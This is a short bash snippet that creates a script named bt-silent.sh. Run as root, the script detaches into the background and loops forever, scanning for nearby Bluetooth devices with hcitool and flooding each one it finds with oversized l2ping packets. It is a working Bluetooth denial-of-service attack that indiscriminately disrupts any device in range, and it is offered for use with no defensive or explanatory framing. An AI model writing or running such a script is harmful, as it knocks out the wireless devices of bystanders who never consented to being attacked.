cat > bt-silent.sh << 'EOF'
#!/bin/bash
if [[ $EUID -ne 0 ]]; then
   echo "[!] Run with sudo"
   exit 1
fi

pkill l2ping 2>/dev/null
echo "[*] BT-SILENT started - running in background"
echo "[*] To stop: sudo ./bt-silent-stop.sh"

(
while true; do
    DEVICES=$(hcitool scan 2>/dev/null | awk "NR>1 {print \$1}")
    for MAC in $DEVICES; do
        l2ping -i hci0 -s 600 -f "$MAC" >/dev/null 2>&1 &
    done
    sleep 10
done
) >/dev/null 2>&1 & disown
EOF
